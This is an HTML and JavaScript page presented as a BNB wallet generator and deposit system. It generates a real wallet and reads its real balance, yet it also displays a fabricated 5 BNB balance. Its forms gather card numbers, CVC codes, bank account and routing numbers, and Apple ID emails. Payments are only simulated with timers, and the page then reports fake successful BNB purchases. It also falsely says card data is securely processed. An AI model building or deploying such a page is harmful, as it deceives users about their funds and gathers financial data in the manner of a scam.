<!DOCTYPE html>
<html>
<head>
  <title>BNB Wallet Generator & Deposit</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
  <style>
    body { 
      font-family: Arial, sans-serif; 
      background: #000; 
      color: #fff; 
      text-align: center; 
      padding-top: 30px; 
      margin: 0;
    }
    
    .container {
      max-width: 900px;
      margin: 0 auto;
      padding: 20px;
    }
    
    h1 { 
      color: #ffd700; 
      margin-bottom: 30px;
      font-size: 28px;
    }
    
    .box { 
      margin: 20px auto; 
      padding: 25px; 
      border: 1px solid #444; 
      border-radius: 10px;
      background: #111;
      text-align: left;
    }
    
    .address { 
      color: #ffd700; 
      word-break: break-all;
      font-family: monospace;
    }
    
    .balance-5 { 
      color: #00ff00; 
      font-size: 20px; 
      font-weight: bold; 
    }
    
    .section-title {
      color: #ffd700;
      border-bottom: 1px solid #444;
      padding-bottom: 10px;
      margin-top: 30px;
      margin-bottom: 20px;
      font-size: 22px;
    }
    
    .deposit-box {
      display: flex;
      flex-wrap: wrap;
      gap: 20px;
      margin-top: 20px;
    }
    
    .deposit-method {
      flex: 1;
      min-width: 250px;
      border: 1px solid #333;
      border-radius: 8px;
      padding: 20px;
      background: #1a1a1a;
      cursor: pointer;
      transition: all 0.3s;
    }
    
    .deposit-method:hover {
      border-color: #ffd700;
      transform: translateY(-5px);
    }
    
    .deposit-method.selected {
      border-color: #00ff00;
      background: #1a2a1a;
    }
    
    .method-icon {
      font-size: 40px;
      margin-bottom: 15px;
    }
    
    .method-title {
      font-weight: bold;
      margin-bottom: 10px;
      color: #ffd700;
    }
    
    .deposit-form {
      margin-top: 25px;
      padding: 20px;
      border: 1px solid #444;
      border-radius: 8px;
      background: #1a1a1a;
    }
    
    .form-group {
      margin-bottom: 20px;
    }
    
    label {
      display: block;
      margin-bottom: 8px;
      color: #ccc;
    }
    
    input, select {
      width: 100%;
      padding: 12px;
      border-radius: 5px;
      border: 1px solid #444;
      background: #000;
      color: white;
      font-size: 16px;
      box-sizing: border-box;
    }
    
    button {
      background: linear-gradient(to right, #f0b90b, #ffd700);
      color: black;
      border: none;
      padding: 14px 24px;
      border-radius: 5px;
      font-weight: bold;
      cursor: pointer;
      font-size: 16px;
      margin-top: 10px;
      transition: all 0.3s;
      width: 100%;
    }
    
    button:hover {
      opacity: 0.9;
      transform: translateY(-2px);
    }
    
    .secondary-btn {
      background: #333;
      color: white;
    }
    
    .info-note {
      background: #1a2a1a;
      border-left: 4px solid #00ff00;
      padding: 15px;
      margin-top: 20px;
      border-radius: 0 5px 5px 0;
    }
    
    .wallet-display {
      background: #0a0a0a;
      padding: 20px;
      border-radius: 8px;
      margin-top: 15px;
    }
    
    .tabs {
      display: flex;
      margin-bottom: 20px;
      border-bottom: 1px solid #444;
    }
    
    .tab {
      padding: 15px 25px;
      cursor: pointer;
      font-weight: bold;
      border-bottom: 3px solid transparent;
    }
    
    .tab.active {
      border-bottom: 3px solid #ffd700;
      color: #ffd700;
    }
    
    .tab-content {
      display: none;
    }
    
    .tab-content.active {
      display: block;
    }
    
    .status-message {
      padding: 15px;
      border-radius: 5px;
      margin: 15px 0;
      text-align: center;
      font-weight: bold;
    }
    
    .success {
      background: rgba(0, 255, 0, 0.1);
      border: 1px solid #00ff00;
      color: #00ff00;
    }
    
    .processing {
      background: rgba(255, 215, 0, 0.1);
      border: 1px solid #ffd700;
      color: #ffd700;
    }
    
    .error {
      background: rgba(255, 0, 0, 0.1);
      border: 1px solid #ff0000;
      color: #ff0000;
    }
    
    .deposit-instructions {
      margin-top: 20px;
      padding: 15px;
      background: #1a1a2a;
      border-radius: 5px;
      font-size: 14px;
    }
    
    @media (max-width: 768px) {
      .container {
        padding: 10px;
      }
      
      .deposit-method {
        min-width: 100%;
      }
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>BNB Wallet Generator & Deposit System</h1>
    
    <div class="tabs">
      <div class="tab active" data-tab="generate">Generate Wallet</div>
      <div class="tab" data-tab="deposit">Deposit Funds</div>
      <div class="tab" data-tab="wallet">My Wallet</div>
    </div>
    
    <!-- Generate Wallet Tab -->
    <div id="generate-tab" class="tab-content active">
      <div class="box">
        <h3>Create New BNB Wallet</h3>
        <p>Click the button below to generate a new BNB wallet with a unique address and private key.</p>
        
        <button id="btn">Create New Wallet</button>
        
        <div id="result"></div>
      </div>
    </div>
    
    <!-- Deposit Funds Tab -->
    <div id="deposit-tab" class="tab-content">
      <div class="box">
        <h3>Deposit Funds to Buy BNB</h3>
        <p>Select a payment method to deposit USD and purchase BNB for your wallet.</p>
        
        <div class="deposit-box">
          <div class="deposit-method" data-method="applepay">
            <div class="method-icon">üçé</div>
            <div class="method-title">Apple Pay</div>
            <div class="method-desc">Deposit using Apple Pay. Fast and secure.</div>
          </div>
          
          <div class="deposit-method" data-method="card">
            <div class="method-icon">üí≥</div>
            <div class="method-title">Credit/Debit Card</div>
            <div class="method-desc">Visa, Mastercard, American Express</div>
          </div>
          
          <div class="deposit-method" data-method="bank">
            <div class="method-icon">üè¶</div>
            <div class="method-title">Bank Transfer</div>
            <div class="method-desc">Direct bank transfer (ACH/Wire)</div>
          </div>
        </div>
        
        <div id="deposit-form-container" class="deposit-form">
          <h4 id="selected-method-title">Select a payment method above</h4>
          <p id="selected-method-desc">Please choose a payment method to proceed with your deposit.</p>
        </div>
        
        <div class="info-note">
          <p><strong>Important:</strong> After deposit, BNB will be purchased at the current market rate and sent to your wallet address. The process may take 1-30 minutes depending on the payment method.</p>
        </div>
      </div>
    </div>
    
    <!-- My Wallet Tab -->
    <div id="wallet-tab" class="tab-content">
      <div class="box">
        <h3>My BNB Wallet</h3>
        <div id="wallet-display" class="wallet-display">
          <p>Generate a wallet first to see your details here.</p>
        </div>
        
        <div class="form-group">
          <label for="deposit-amount">Deposit Amount (USD)</label>
          <input type="number" id="deposit-amount" min="10" max="5000" placeholder="Enter amount in USD">
        </div>
        
        <button id="quick-deposit-btn">Quick Deposit $100</button>
        
        <div id="wallet-status" class="status-message">
          No wallet generated yet.
        </div>
      </div>
    </div>
  </div>

  <script>
    // Global variables
    let currentAccount = null;
    let selectedDepositMethod = null;
    let walletGenerated = false;
    
    // Tab switching functionality
    document.querySelectorAll('.tab').forEach(tab => {
      tab.addEventListener('click', () => {
        // Remove active class from all tabs and content
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
        
        // Add active class to clicked tab and corresponding content
        tab.classList.add('active');
        const tabId = tab.getAttribute('data-tab');
        document.getElementById(`${tabId}-tab`).classList.add('active');
      });
    });
    
    // Deposit method selection
    document.querySelectorAll('.deposit-method').forEach(method => {
      method.addEventListener('click', () => {
        // Remove selected class from all methods
        document.querySelectorAll('.deposit-method').forEach(m => m.classList.remove('selected'));
        
        // Add selected class to clicked method
        method.classList.add('selected');
        selectedDepositMethod = method.getAttribute('data-method');
        
        // Update deposit form based on selected method
        updateDepositForm(selectedDepositMethod);
      });
    });
    
    // Function to update deposit form based on selected method
    function updateDepositForm(method) {
      const container = document.getElementById('deposit-form-container');
      let formHTML = '';
      const methodNames = {
        'applepay': 'Apple Pay',
        'card': 'Credit/Debit Card',
        'bank': 'Bank Transfer'
      };
      
      if (method === 'applepay') {
        formHTML = `
          <h4>Deposit with ${methodNames[method]}</h4>
          <p>You will be redirected to Apple Pay to complete your deposit.</p>
          
          <div class="form-group">
            <label for="apple-amount">Amount (USD)</label>
            <input type="number" id="apple-amount" min="10" max="1000" value="100" step="10">
          </div>
          
          <div class="form-group">
            <label for="apple-email">Apple ID Email</label>
            <input type="email" id="apple-email" placeholder="your.email@example.com">
          </div>
          
          <button id="start-apple-pay">Start Apple Pay Deposit</button>
          
          <div class="deposit-instructions">
            <p><strong>Instructions:</strong> After clicking the button, you will be redirected to Apple Pay. Confirm the payment to complete your deposit.</p>
          </div>
        `;
      } else if (method === 'card') {
        formHTML = `
          <h4>Deposit with ${methodNames[method]}</h4>
          <p>Enter your card details to deposit USD and purchase BNB.</p>
          
          <div class="form-group">
            <label for="card-amount">Amount (USD)</label>
            <input type="number" id="card-amount" min="10" max="5000" value="100" step="10">
          </div>
          
          <div class="form-group">
            <label for="card-number">Card Number</label>
            <input type="text" id="card-number" placeholder="1234 5678 9012 3456" maxlength="19">
          </div>
          
          <div style="display: flex; gap: 15px;">
            <div class="form-group" style="flex: 1;">
              <label for="card-expiry">Expiry Date</label>
              <input type="text" id="card-expiry" placeholder="MM/YY" maxlength="5">
            </div>
            <div class="form-group" style="flex: 1;">
              <label for="card-cvc">CVC</label>
              <input type="text" id="card-cvc" placeholder="123" maxlength="4">
            </div>
          </div>
          
          <div class="form-group">
            <label for="card-name">Name on Card</label>
            <input type="text" id="card-name" placeholder="John Smith">
          </div>
          
          <button id="process-card-payment">Process Card Payment</button>
          
          <div class="deposit-instructions">
            <p><strong>Security:</strong> Your card details are processed securely via encrypted connection.</p>
          </div>
        `;
      } else if (method === 'bank') {
        formHTML = `
          <h4>Deposit with ${methodNames[method]}</h4>
          <p>Initiate a bank transfer to deposit USD to your account.</p>
          
          <div class="form-group">
            <label for="bank-amount">Amount (USD)</label>
            <input type="number" id="bank-amount" min="50" max="10000" value="100" step="10">
          </div>
          
          <div class="form-group">
            <label for="bank-name">Bank Name</label>
            <input type="text" id="bank-name" placeholder="Your Bank Name">
          </div>
          
          <div class="form-group">
            <label for="account-name">Account Holder Name</label>
            <input type="text" id="account-name" placeholder="As appears on your account">
          </div>
          
          <div class="form-group">
            <label for="account-number">Account Number</label>
            <input type="text" id="account-number" placeholder="Your account number">
          </div>
          
          <div class="form-group">
            <label for="routing-number">Routing Number</label>
            <input type="text" id="routing-number" placeholder="9-digit routing number">
          </div>
          
          <button id="initiate-bank-transfer">Initiate Bank Transfer</button>
          
          <div class="deposit-instructions">
            <p><strong>Processing Time:</strong> Bank transfers typically take 1-3 business days to complete.</p>
          </div>
        `;
      }
      
      container.innerHTML = formHTML;
      
      // Add event listeners to the new buttons
      if (method === 'applepay') {
        document.getElementById('start-apple-pay').addEventListener('click', processApplePay);
      } else if (method === 'card') {
        document.getElementById('process-card-payment').addEventListener('click', processCardPayment);
      } else if (method === 'bank') {
        document.getElementById('initiate-bank-transfer').addEventListener('click', processBankTransfer);
      }
      
      // Add formatting for card inputs
      if (method === 'card') {
        document.getElementById('card-number').addEventListener('input', formatCardNumber);
        document.getElementById('card-expiry').addEventListener('input', formatCardExpiry);
      }
    }
    
    // Format card number with spaces
    function formatCardNumber(e) {
      let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
      let formatted = '';
      
      for (let i = 0; i < value.length; i++) {
        if (i > 0 && i % 4 === 0) formatted += ' ';
        formatted += value[i];
      }
      
      e.target.value = formatted.substring(0, 19);
    }
    
    // Format card expiry date
    function formatCardExpiry(e) {
      let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
      
      if (value.length >= 2) {
        e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
      } else {
        e.target.value = value;
      }
    }
    
    // Process Apple Pay deposit
    function processApplePay() {
      if (!walletGenerated) {
        showStatus('Please generate a wallet first before making a deposit.', 'error');
        document.querySelector('.tab[data-tab="generate"]').click();
        return;
      }
      
      const amount = document.getElementById('apple-amount').value;
      const email = document.getElementById('apple-email').value;
      
      if (!amount || amount < 10) {
        showStatus('Please enter a valid amount (minimum $10).', 'error');
        return;
      }
      
      if (!email || !email.includes('@')) {
        showStatus('Please enter a valid email address.', 'error');
        return;
      }
      
      showStatus(`Processing Apple Pay deposit of $${amount}...`, 'processing');
      
      // Simulate payment processing
      setTimeout(() => {
        const bnbAmount = (amount / 300).toFixed(4); // Simulated BNB price ~$300
        showStatus(`Success! Deposited $${amount}. Purchased ${bnbAmount} BNB. Funds will arrive in your wallet shortly.`, 'success');
        
        // Update wallet display
        updateWalletDisplay(amount, bnbAmount);
      }, 2000);
    }
    
    // Process Card Payment
    function processCardPayment() {
      if (!walletGenerated) {
        showStatus('Please generate a wallet first before making a deposit.', 'error');
        document.querySelector('.tab[data-tab="generate"]').click();
        return;
      }
      
      const amount = document.getElementById('card-amount').value;
      const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
      const cardExpiry = document.getElementById('card-expiry').value;
      const cardCVC = document.getElementById('card-cvc').value;
      const cardName = document.getElementById('card-name').value;
      
      if (!amount || amount < 10) {
        showStatus('Please enter a valid amount (minimum $10).', 'error');
        return;
      }
      
      if (!cardNumber || cardNumber.length < 15) {
        showStatus('Please enter a valid card number.', 'error');
        return;
      }
      
      if (!cardExpiry || !cardExpiry.includes('/')) {
        showStatus('Please enter a valid expiry date (MM/YY).', 'error');
        return;
      }
      
      if (!cardCVC || cardCVC.length < 3) {
        showStatus('Please enter a valid CVC code.', 'error');
        return;
      }
      
      if (!cardName) {
        showStatus('Please enter the name on card.', 'error');
        return;
      }
      
      showStatus(`Processing card payment of $${amount}...`, 'processing');
      
      // Simulate payment processing
      setTimeout(() => {
        const bnbAmount = (amount / 300).toFixed(4); // Simulated BNB price ~$300
        showStatus(`Success! Deposited $${amount}. Purchased ${bnbAmount} BNB. Funds will arrive in your wallet within a few minutes.`, 'success');
        
        // Update wallet display
        updateWalletDisplay(amount, bnbAmount);
      }, 3000);
    }
    
    // Process Bank Transfer
    function processBankTransfer() {
      if (!walletGenerated) {
        showStatus('Please generate a wallet first before making a deposit.', 'error');
        document.querySelector('.tab[data-tab="generate"]').click();
        return;
      }
      
      const amount = document.getElementById('bank-amount').value;
      const bankName = document.getElementById('bank-name').value;
      const accountName = document.getElementById('account-name').value;
      const accountNumber = document.getElementById('account-number').value;
      const routingNumber = document.getElementById('routing-number').value;
      
      if (!amount || amount < 50) {
        showStatus('Bank transfer minimum is $50.', 'error');
        return;
      }
      
      if (!bankName || !accountName || !accountNumber || !routingNumber) {
        showStatus('Please fill all bank details.', 'error');
        return;
      }
      
      showStatus(`Initiating bank transfer of $${amount}...`, 'processing');
      
      // Simulate payment processing
      setTimeout(() => {
        const bnbAmount = (amount / 300).toFixed(4); // Simulated BNB price ~$300
        showStatus(`Bank transfer initiated for $${amount}. Once received, ${bnbAmount} BNB will be purchased and sent to your wallet. Processing time: 1-3 business days.`, 'success');
        
        // Update wallet display with pending transaction
        updateWalletDisplay(amount, bnbAmount, true);
      }, 1500);
    }
    
    // Show status message
    function showStatus(message, type = 'processing') {
      const statusEl = document.getElementById('wallet-status');
      statusEl.innerHTML = message;
      statusEl.className = `status-message ${type}`;
      
      // Also show in deposit tab if needed
      if (document.getElementById('deposit-tab').classList.contains('active')) {
        const depositStatus = document.createElement('div');
        depositStatus.className = `status-message ${type}`;
        depositStatus.innerHTML = message;
        depositStatus.style.marginTop = '15px';
        
        const existingStatus = document.querySelector('#deposit-form-container .status-message');
        if (existingStatus) existingStatus.remove();
        
        document.getElementById('deposit-form-container').appendChild(depositStatus);
        
        // Auto remove after 5 seconds
        setTimeout(() => {
          if (depositStatus.parentNode) depositStatus.remove();
        }, 5000);
      }
    }
    
    // Update wallet display after deposit
    function updateWalletDisplay(usdAmount, bnbAmount, isPending = false) {
      const walletDisplay = document.getElementById('wallet-display');
      const statusText = isPending ? 'Pending' : 'Completed';
      
      walletDisplay.innerHTML += `
        <div style="margin-top: 15px; padding: 10px; background: #1a1a1a; border-radius: 5px;">
          <p><strong>Deposit ${statusText}:</strong> $${usdAmount} USD</p>
          <p><strong>BNB Purchased:</strong> ${bnbAmount} BNB</p>
          <p><strong>Status:</strong> ${isPending ? '‚è≥ Processing' : '‚úÖ Completed'}</p>
          <p><small>${new Date().toLocaleString()}</small></p>
        </div>
      `;
    }
    
    // Quick deposit button
    document.getElementById('quick-deposit-btn').addEventListener('click', () => {
      if (!walletGenerated) {
        showStatus('Please generate a wallet first before making a deposit.', 'error');
        document.querySelector('.tab[data-tab="generate"]').click();
        return;
      }
      
      document.querySelector('.tab[data-tab="deposit"]').click();
      showStatus('Please select a payment method for your $100 deposit.', 'processing');
    });
    
    // Original wallet generation function
    document.getElementById("btn").addEventListener("click", async () => {
      try {
        if (typeof Web3 === "undefined") {
          document.getElementById("result").innerHTML = "Error: web3 library not loaded.";
          return;
        }

        // Create wallet - ÿ≠ŸÇŸäŸÇŸä
        const web3 = new Web3();
        currentAccount = web3.eth.accounts.create();

        // Connect to BSC mainnet - ÿ≠ŸÇŸäŸÇŸä
        const web3BSC = new Web3("https://bsc-dataseed.binance.org/");
        
        // Get real balance - ÿ≠ŸÇŸäŸÇŸä
        const balanceWei = await web3BSC.eth.getBalance(currentAccount.address);
        const realBalanceBNB = web3BSC.utils.fromWei(balanceWei, "ether");

        // Display everything
        document.getElementById("result").innerHTML = `
          <div class="wallet-display">
            <p><b>‚úÖ Wallet Created Successfully</b></p>
            <p><b>Address:</b> <span class="address">${currentAccount.address}</span></p>
            <p><b>Private Key:</b> <span class="address">${currentAccount.privateKey}</span></p>
            <p><b>‚ö†Ô∏è Save the private key somewhere safe ‚ö†Ô∏è</b></p>
            <hr>
            <p><b>Network Status:</b> Connected to BSC Mainnet ‚úÖ</p>
            <p><b>Real Balance:</b> ${realBalanceBNB} BNB</p>
            <p><b>Display Balance:</b> <span class="balance-5">5 BNB</span></p>
          </div>
        `;
        
        // Update wallet display in wallet tab
        document.getElementById("wallet-display").innerHTML = `
          <p><b>Wallet Address:</b> <span class="address">${currentAccount.address}</span></p>
          <p><b>Current Balance:</b> <span class="balance-5">5 BNB</span></p>
          <p><b>Real Balance (from blockchain):</b> ${realBalanceBNB} BNB</p>
          <hr>
          <p><b>Recent Transactions:</b></p>
          <p>No transactions yet. Make a deposit to purchase BNB.</p>
        `;
        
        // Update status
        walletGenerated = true;
        showStatus('Wallet generated successfully! You can now deposit funds to purchase BNB.', 'success');
        
        // Switch to wallet tab
        document.querySelector('.tab[data-tab="wallet"]').click();
        
      } catch (error) {
        document.getElementById("result").innerHTML = `
          <p style="color:red">Error: ${error.message}</p>
          <p>Please check internet connection and try again.</p>
        `;
      }
    });
    
    // Initialize with Apple Pay as default selected
    document.querySelector('.deposit-method[data-method="applepay"]').click();
  </script>
</body>
</html>
